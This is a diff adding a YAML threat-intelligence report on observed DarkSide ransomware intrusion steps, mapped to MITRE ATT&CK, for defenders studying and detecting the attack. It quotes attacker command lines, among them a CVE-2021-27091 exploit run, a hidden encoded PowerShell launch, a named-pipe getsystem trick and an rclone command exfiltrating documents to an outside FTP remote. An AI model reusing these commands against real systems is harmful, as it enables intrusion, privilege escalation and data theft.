@@ -1,0 +1,471 @@
+---
+header:
+  sightingReportId: 12daede3-2b92-457d-bb37-050ac9eb78e8
+  status: wip
+  description: This Threat Sighting documents observed TTPs for DarkSide ransomware. This Threat Sighting is based on direct observation.
+  author: Alejandro Houspanossian (@lekz86)
+  acknowledgement: "@lekz86"
+  tlp: white
+  threatInformation:
+    adversaries:
+    - DarkSide
+    malware:
+    - darkside ransomware
+    tools:
+    - nltest.exe
+    - rclone.exe
+    - bloodhound
+    - explorer.exe
+    - cobaltstrike
+    - perfusion #https://github.com/itm4n/Perfusion
+    - RDP
+    lolbas:
+    - rundll32
+    - cmd
+threatSightings:
+  - sighting: Initial Access - DarkSide used _Valid Credentials_ over _RDP_ for Initial Access.
+    id: 323dcfb7-ebea-4ca3-b8f6-637518515903
+    behaviors:
+    - behavior: No details available about User Login.
+      weapon: RDP
+      type: User Login
+      id: 00000000-0000-0000-0000-000000000001
+      notes:
+        - Initial Access was unclear during the time of this investigation.
+        - After some time, journalists reported Initial Access via valid credentials acquired on dark web.
+        - https://www.newsweek.com/colonial-pipeline-hackers-used-unprotected-vpn-access-network-report-1597842
+      att&ck:
+        initialAccess:
+        - "T1021.001 - Remote Services: Remote Desktop Protocol"
+        - "T1078 - Valid Accounts"
+  - sighting: Initial Access - DarkSide used _Valid Credentials_ over _RDP_ for Lateral Movement.
+    id: 5f6eeb61-26bc-43aa-8c83-e39d9f530c34
+    behaviors:
+    - behavior: No details available about User Login.
+      weapon: RDP
+      type: User Login
+      id: 00000000-0000-0000-0000-000000000000
+      notes:
+      - Threat actor loged to multiple systems.
+      att&ck:
+        lateralMovement:
+        - "T1021.001 - Remote Services: Remote Desktop Protocol"
+        - "T1078 - Valid Accounts"
+  - sighting: Lateral Movement - DarkSide used _RDP_ to download software tools for Command And Control.
+    id: 233c00d0-ea09-4db8-b0e8-284975748869
+    behaviors:
+    - behavior: Explorer.exe dropped multiple files.
+      type: File Created
+      weapon: explorer
+      id: abc5da53-58c3-446d-88d1-10347b16cabc
+      files:
+        - name: rembemrO.exe
+          path: 'C:\\Users\\#{user}\\Music\\rembemrO.exe'
+          sha256: A6270B487D8AF20CDEF2A86FF5D05DBAA267AE718DE0CD8E26298DE62067457E
+          process: "C:\\Windows\\Explorer.exe"
+        - name: perfect_x64.exe
+          path: 'C:\\Users\\#{user}\\Music\\perfect_x64.exe'
+          sha256: A9EEA7ACA0AB17B52ECA51F16C2C193ADCF8B32B4E029032C805ECCCCD93BA77
+          process: "C:\\Windows\\Explorer.exe"
+        - name: perfect_x64.exe
+          path: 'C:\\Users\\#{user}\\Music\\perfect_x64.exe'
+          sha256: 4691D60B358E65ACDFD48C15E5523FCB6B32158899BC238BD3DC3197BBD9E497
+          process: "C:\\Windows\\Explorer.exe"
+      notes:
+      - Darkside was reported to have used _C:\\Users\\#{user}\\Music\\_ folder in other engagements.
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+        lateralMovement:
+        - "T1021.001 - Remote Services: Remote Desktop Protocol"
+  - sighting: Lateral Movement - DarkSide used _RDP_ to execute _CMD_ for Execution.
+    id: 1234bad0-b254-4fb8-a6d2-185e96e93f12
+    behaviors:
+    - behavior: _Explorer_ opened _CMD_.
+      weapon: explorer
+      id: 4561e090-e1ec-4ba8-baf6-d4e8235b345a
+      type: Process Created
+      processes:
+      - process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - 'C:\\Windows\\System32\\cmd.exe'
+        parentProcess: C:\\Windows\\Explorer.exe
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Execution - DarkSide used _CMD_ to execute a CVE-2021-27091 exploit for Privilege Escalation.
+    id: 6d46bad0-b254-4fb8-a6d2-185e96e93f09
+    behaviors:
+    - behavior: Exploit (PE) for CVE-2021-27091 is executed.
+      weapon: perfusion
+      id: abc1e090-e1ec-4ba8-baf6-d4e8235b36aa
+      type: Process Created
+      processes:
+      - process: C:\\Users\\#{user}\\Music\\perfect_x64.exe
+        cmdLine:
+        - 'perfect_x64.exe -k Dnscache -c cmd -I'
+      notes:
+      - "CVE-2021-27091 in a nutshell: a user without privileges can modify the Windows Registry settings of DNSCACHE and RpcEptMapper Windows Services to achieve arbitrary code excution with High Privileges."
+      - 'https://itm4n.github.io/windows-registry-rpceptmapper-eop/'
+      - 'https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-27091'
+      att&ck:
+        privilegeEscalation:
+        - "T1203 - Exploitation for Client Execution"
+    - behavior: Exploit spawned _CMD_ without commandline arguments.
+      id: 4441e090-e1ec-4aa8-baf6-d4e8235b3444
+      weapon: perfusion
+      type: Process Created
+      processes:
+      - process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - 'cmd'
+        parentProcess: C:\\Users\\#{user}\\Music\\perfect_x64.exe
+      att&ck:
+        privilegeEscalation:
+        - "T1203 - Exploitation for Client Execution"
+    - behavior: Exploit created _dll_ file.
+      id: 12387649-62aa-41c0-92d3-93bccf268b8f
+      type: File Created
+      weapon: perfusion
+      files:
+        - path: C:\\Users\\#{user}\\AppData\\Local\\Temp\\performance_15820_14496_117.dll
+          name: performance_15820_14496_117.dll
+          sha256: 179728673006FE2069418BD47413ED9AD766325B9A9408C86D1BAA9147C4F939
+    - behavior: Exploit created _Performance_ subkey on DNSCACHE Windows Service and provides a malicious _DLL_ file.
+      id: 123e6318-2920-4444-8648-414c9aafc123
+      type: RegValue Created
+      weapon: perfusion
+      registries:
+        - keyName: HKLM\\SYSTEM\\CONTROLSET001\\SERVICES\\DNSCACHE\\PERFORMANCE
+          keyValue: 'C:\\Users\\REDACTED\\AppData\\Local\\Temp\\performance_15820_14496_117.dll'
+          process: 'c:\\windows\\syswow64\\rundll32.exe'
+      notes:
+      - The PERFORMANCE subkey is intended to attacht a porformance monitor to the Windows service.
+      - Instead of a perf monitor DLL, the exploit provides a malicious DLL for arbitrary code execution.
+      - Finally, to actually get the arbitrary code to run, only need to call the performance counters.
+      att&ck:
+        privilegeEscalation:
+        - "T1112 - Modify Registry"
+        - "T1543.003 - Create or Modify System Process: Windows Service"
+  - sighting: Command And Control - DarkSide used _nltest.exe_ via interactive _PowerShell_ for Discovery.
+    id: 056d9e0b-fb5e-4851-b2ef-a302b0b3c98b
+    behaviors:
+    - behavior: PowerShell interpreter launched.
+      id: adaddb54-6b61-4121-9bd9-825a8feb4133
+      type: Process Created
+      weapon: powershell
+      processes:
+      - process: c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe
+        cmdLine:
+        - 'c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe'
+        parentProcess: n/d
+      att&ck:
+        execution:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+    - behavior: _PowerShell_ spawned nltest.exe
+      type: Process Created
+      weapon: powershell
+      id: e2d526aa-1db0-4ce9-a643-e03bfc6c9dea
+      processes:
+      - process: c:\\windows\\system32\\nltest.exe
+        cmdLine:
+        - 'c:\\windows\\system32\\nltest.exe /dclist:yourcompany.com'
+        parentProcess: c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe
+      notes:
+      - _Nltest_ is a Windows command-line utility used to list domain controllers and enumerate domain trusts.
+      - https://attack.mitre.org/software/S0359/
+      att&ck:
+        discovery:
+        - "T1018 - Remote System Discovery"
+  - sighting: Execution - DarkSide used _Cobalt Strike_ HTTP beacons for Command And Control.
+    id: 74bd9943-122c-4de2-9fc9-b0f01be3e73a
+    behaviors:
+    - behavior: Sustained C2 activity.
+      id: 45670107-175b-1234-a242-4e89ab1bd234
+      type: Network Accessed
+      weapon: cobaltstrike
+      connections:
+        - dstIp: 13[.]107.246.41
+          dstHost: assets[.]outlook.com
+          protocol: TCP
+          dstPort: 443
+          direction: outbound
+      att&ck:
+        commandAndControl:
+        - "T1071.004 - Application Layer Protocol: Web Protocols"
+  - sighting: Execution - DarkSide used _Windows Services_ for Persistence.
+    id: 999d9943-122c-4de2-9fc9-b0f01be3e799
+    behaviors:
+    - behavior: created windows services.
+      id: 7778bc41-362a-4596-9ee8-9897557e9477
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\Windows\\System32\\sc.exe
+        cmdLine:
+        - n/d
+        parentProcess: n/d
+      att&ck:
+        persistence:
+        - "T1543.003 - Create or Modify System Process: Windows Service"
+  - sighting: Persistence - DarkSide used _Windows Services_ to launch Cobalt Strike beacon PE file for Command And Control.
+    id: 1235b55f-dcd2-4d97-b6cb-6cdcce8fd576
+    behaviors:
+    - behavior: PE file executed from ADMIN$ folder by services.exe.
+      id: b868bc41-362a-4596-9ee8-9897557e947b
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: \\\\#{IP}\\ADMIN$\\e10a2f3.exe
+        embedFilename: undefined
+        cmdLine:
+        - \\\\#{IP}\\ADMIN$\\e10a2f3.exe
+        sha256: 11D4978BF49A98F169FD82425B7CBC5DEDCD33881AE6D4CB0C5530ECC631F640
+        parentProcess: C:\\Windows\\System32\\services.exe
+      notes:
+      - ADMIN$ is one of the default administrative network shares in Windows.
+      - ADMIN$ is hidden, and links to C:\\Windows.
+      - ADMIN$ is typically used to deploy software remotely.
+      - \\\\#{IP}\\ADMIN$\\ is a probable indicator of remote execution.
+      - The filename pattern [a-z0-9]{7}.exe is known for Cobalt Strike PE beacons.
+      att&ck:
+        execution:
+        - "T1569.002 - System Services: Service Execution"
+    - behavior: PE file connected to default Cobalt Strike named pipe (MSSE-*).
+      id: 621ca01e-7e2c-47e6-80a3-2a23d58a2c92
+      type: NamedPipe Connected
+      weapon: cobaltstrike
+      pipes:
+      - name: '\\\\.\\pipe\\MSSE-5861-server'
+        process: \\\\#{IP}\\ADMIN$\\e10a2f3.exe
+      notes:
+      - NamedPipes are an inter-process communication mechanism on Windows.
+      - NamedPipe traffic that goes host-to-host is encapsulated within the SMB protocol.
+      - NamedPipe name pattern 'MSSE-[0-9]{4}-server' is one of the default NamedPipes used by Cobalt Strike.
+      att&ck:
+        commandAndControl:
+        - "T1071 - Application Layer Protocol"
+  - sighting: Command And Control - DarkSide used process injection into _RUNDLL32_ and _DLLHOST_ to launch post-exploitation tasks for Defense Evasion.
+    id: dc12dec5-af9f-4776-8813-17f7d5468d54
+    behaviors:
+    - behavior: PE file spawned RUNDLL32 without command-line arguments.
+      id: f383e553-ff06-4b0b-bbd9-b2682bbc73d4
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\Windows\\System32\\rundll32.exe
+        cmdLine:
+        - C:\\Windows\\System32\\rundll32.exe
+        parentProcess: \\\\#{IP}\\ADMIN$\\e10a2f3.exe
+      notes:
+      - RUNDLL32 is part of Windows.
+      - RUNDLL32 is used to launch functionality stored in a DLL file.
+      - RUNDLL32 without commmand-line arguments is suspicious.
+      - RUNDLL32 is default Spawn_to process for Cobalt Strike.
+      - Cobalt Strike is a post-explotaition tool widely used in attacks.
+      att&ck:
+        execution:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+    - behavior: PE file injected RUNDLL32.
+      id: f609d11c-b1aa-4dc3-b75b-56b175661716
+      type: Process Hollowed
+      weapon: cobaltstrike
+      injections:
+      - from: \\\\#{IP}\\ADMIN$\\e10a2f3.exe
+        target: C:\\Windows\\System32\\rundll32.exe
+      notes:
+      - Process hollowing is a method of executing arbitrary code in the address space of a separate live process.
+      - Cobalt Strike injects into temporary processes for execution.
+      att&ck:
+        execution:
+        - "T1055.012 - Process Injection: Process Hollowing"
+    - behavior: RUNDLL32 created ~20 instances of DLLHOST without command-line arguments.
+      id: 1669ecb0-3a8a-4858-9efd-23e5c01ad643
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\Windows\\System32\\dllhost.exe
+        cmdLine:
+        - C:\\Windows\\System32\\dllhost.exe
+        parentProcess: C:\\Windows\\System32\\rundll32.exe
+      notes:
+      - DLLHOST (a.k.a. COM Surrogate) is intented to execute DLLs.
+      - DLLHOST without commmand-line arguments is suspicious.
+  - sighting: Command And Control - DarkSide used _Cobalt Strike_ to execute _BloodHound_ in memory for Discovery.
+    id: f33125a7-e43d-4547-a636-089c40c72466
+    behaviors:
+    - behavior: DLLHOST connected to default Cobalt Strike named pipe (postex_*).
+      id: 1dfd3613-6b33-486b-99bb-e87a98346887
+      type: NamedPipe Connected
+      weapon: cobaltstrike
+      pipes:
+      - name: '\\\\.\\pipe\\postex_d0e7'
+        process: C:\\Windows\\System32\\dllhost.exe
+      notes:
+      - NamedPipe name pattern 'postex_[a-z0-9]{4}' is one of the default NamedPipes used by Cobalt Strike.
+      att&ck:
+        commandAndControl:
+        - "T1071 - Application Layer Protocol"
+    - behavior: DLLHOST performed multiple DNS Query events.
+      id: 762daeff-39c9-4741-a255-f8dfca2ba18a
+      type: DNS Queried
+      weapon: cobaltstrike
+      connections:
+      - dstHost: 'SQL03.COMPANY.COM'
+        protocol: udp
+        process: C:\\Windows\\System32\\dllhost.exe
+        direction: outbound
+      att&ck:
+        discovery:
+        - "T1018 - Remote System Discovery"
+    - behavior: DLLHOST performed hundreds of network connections to local network
+      id: ced277c3-f68a-42b5-b153-55e1983d17ec
+      type: Network Accessed
+      weapon: cobaltstrike
+      connections:
+        - protocol: tcp
+          dstIp: '#{PRIVATEIP}'
+          dstPort: 445
+          direction: outbound
+          process: C:\\Windows\\System32\\dllhost.exe
+      notes:
+      - The srcPort is high port number, eg. 63794.
+      att&ck:
+        discovery:
+        - "T1046 - Network Service Scanning"
+    - behavior: DLLHOST created json files and a zip file
+      id: 00e87649-62aa-41c0-92d3-93bccf268b8f
+      type: File Created
+      weapon: bloodhound
+      files:
+        - path: C:\\Windows\\System32\\20210101190124_users.json
+          name: 20210101190124_users.json
+          process: C:\\Windows\\System32\\dllhost.exe
+        - path: C:\\Windows\\System32\\20210101190124_computers.json
+          name: 20210101190124_computers.json
+          process: C:\\Windows\\System32\\dllhost.exe
+        - path: C:\\Windows\\System32\\20210101190124_groups.json
+          name: 20210101190124_groups.json
+          process: C:\\Windows\\System32\\dllhost.exe
+        - path: C:\\Windows\\System32\\20210101190124_ous.json
+          name: 20210101190124_ous.json
+        - path: C:\\Windows\\System32\\20210101190124_gpos.json
+          name: 20210101190124_gpos.json
+          process: C:\\Windows\\System32\\dllhost.exe
+        - path: C:\\Windows\\System32\\20210101190124_BloodHound.zip
+          name: 20210101190124_BloodHound.zip
+          process: C:\\Windows\\System32\\dllhost.exe
+      notes:
+      - BloodHound is an Active Directory (AD) reconnaissance tool.
+      - BloodHound outputs results as JSON files
+      - BloodHound can collect information about the following objects (users, computers, groups, gpos)
+      - BloodHound can archive collected a ZIP file
+      att&ck:
+        discovery:
+        - "T1560 - Archive Collected Data"
+  - sighting: Persistence - DarkSide used _Windows Services_ to launch _Cobalt Strike PowerShell_ command via _CMD_ for Command And Control.
+    id: d3e362aa-4489-4d7f-b568-77610fc26fe3
+    behaviors:
+    - behavior: _CMD_ executed highly obfuscated _PowerShell_ command.
+      id: 8eb7afc6-510f-48f3-9fd1-bcc976f4ebbe
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: 'C:\\Windows\\SysWOW64\\cmd.exe'
+        cmdLine:
+        - '/b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcAL[REDACTED]'
+      notes:
+      - Command-line pattern '/b /c start /b /min powershell' used by Cobalt Strike to execute its code a service.
+      - Cobalt Strike executes PowerShell command as Windows Services.
+      - Command-line patter 'powershell -nop -w hidden -encodedcommand' used by Cobalt Strike to execute PowerShell encoded commands.
+      - Cobalt Strike executes encoded PowerShell commands to load beacons shellcode into memory.
+      att&ck:
+        execution:
+        - "T1569.002 - System Services: Service Execution"
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        defenseEvasion:
+        - "T1140 - Deobfuscate/Decode Files or Information"
+  - sighting: Command And Control - DarkSide used _Cobalt Strike_  Named Pipes Impersonation for Privilege Escalation.
+    id: 976a5bfa-045d-466a-b936-7cc299133d85
+    behaviors:
+    - behavior: Privilege Escalation via Named Pipes Impersonation (Cobalt/Meterpreter getSystem)
+      id: 310f5757-59b0-4cff-994a-2921d2d52cfc
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\Windows\\system32\\cmd.exe
+        parentProcess: C:\\Windows\\System32\\services.exe
+        cmdLine:
+        - 'C:\\Windows\\system32\\cmd.exe /c echo 675f2d61c15 > \\\\.\\pipe\\526c8c'
+      notes:
+      - _getSystem_ is a command for Privilege Escalation available at Cobalt Strike and Meterpreter.
+      - "How does it work? Meterpreter creates a Named Pipe; and creates and launch a service to run _cmd.exe /c echo [some data] >\\\\.\\pipe\\[random pipe here]_. When the spawned _cmd.exe_ connects to Meterpreters named pipe, Meterpreter has the opportunity to impersonate that security context. Impersonation of clients is a named pipes feature. The context of the service is SYSTEM, so when you impersonate it, you become SYSTEM."
+      - https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/
+      att&ck:
+        privilegeEscalation:
+        - "T1134 - Access Token Manipulation"
+  - sighting: Lateral Movement - DarkSide used _RDP_ to execute a renamed copy of _rclone.exe_ for Exfiltration.
+    id: 2133e6a6-caba-4718-8e08-24bb9900bf22
+    behaviors:
+    - behavior: _CMD_ created a renamed copy of rclone.exe
+      type: File Created
+      weapon: cmd
+      id: abc5da53-58c3-446d-88d1-10347b16c123
+      files:
+        - name: nfscsvc.exe
+          path: 'C:\\User\\Public\\nfscsvc.exe'
+          embedFilename: rclone.exe
+          process: "C:\\Windows\\System32\\cmd.exe"
+      att&ck:
+        defenseEvasion:
+        - "T1036 - Masquerading"
+    - behavior: rclone execution.
+      id: 1234db54-6b61-4121-5678-825a8feb4133
+      type: Process Created
+      weapon: rclone
+      processes:
+      - process: C:\\User\\Public\\rclone.exe
+        cmdLine:
+        - 'nfscsvc copy "\\\\REDACTED" ftp2:/mnt/volume_nyc1_03/loads/REDACTED --max-age 1y --stats-one-line -P --stats 2s --ignore-existing --drive-chunk-size 512M --buffer-size=4G --transfers 20 --checkers 40 --include "*.{xls,xlsx,doc,docx,pdf})'
+        parentProcess: C:\\Windows\\System32\\cmd.exe
+      notes:
+      - "Rclone is a command line program to manage files on cloud storage. Over 40 cloud storage products support rclone including S3 object stores, business & consumer file storage services, as well as standard transfer protocols (source: rclone.org)."
+      - _C:\\Users\\Public_ is the _Public_ folder in Windows. User accounts on the device have access to it. Also, network computers may have access to it, depending on network sharing settings.
+      att&ck:
+        exfiltration:
+        - "T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+  - sighting: Defense Evasion - DarkSide used _Rundll32_ to launch encryption for Impact.
+    id: 820ab7ad-b92a-4e18-bd1e-2d656cdc8f9d
+    behaviors:
+    - behavior: _Rundll32_ ran malicious DLL
+      id: 1234afc6-2345-48f3-9fd1-bcc976f41234
+      type: Process Created
+      weapon: rundll32
+      processes:
+      - process: 'C:\\Windows\\SysWOW64\\rundll32.exe'
+        cmdLine:
+        - C:\\Windows\\SysWOW64\\rundll32.exe c:\\sources\\solf.dll,#3 worker1 job1-11940
+      att&ck:
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+    - behavior: Created ransom notes
+      type: File Created
+      weapon: darkside ransomware
+      id: 1234da53-58c3-446d-88d1-10347b161234
+      files:
+        - name: README.[a-z0-9]{8}.TXT
+          path: '*\\README.[a-z0-9]{8}.TXT'
+          sha256: n/d
+          process: "C:\\Windows\\SysWOW64\\rundll32.exe"
+      att&ck:
+        impact:
+        - "T1486 - Data Encrypted for Impact"
+footer:
+  changeTracking:
+    created: 2022-02-22
+    lastModified: 2022-03-16
+    sightingVersion: 1.1
+    schemaVersion: 1.7
+  references:
+    - https://www.mandiant.com/resources/shining-a-light-on-darkside-ransomware-operations
+    - https://www.trellix.com/en-us/threat-center/threat-reports/jan-2022.html
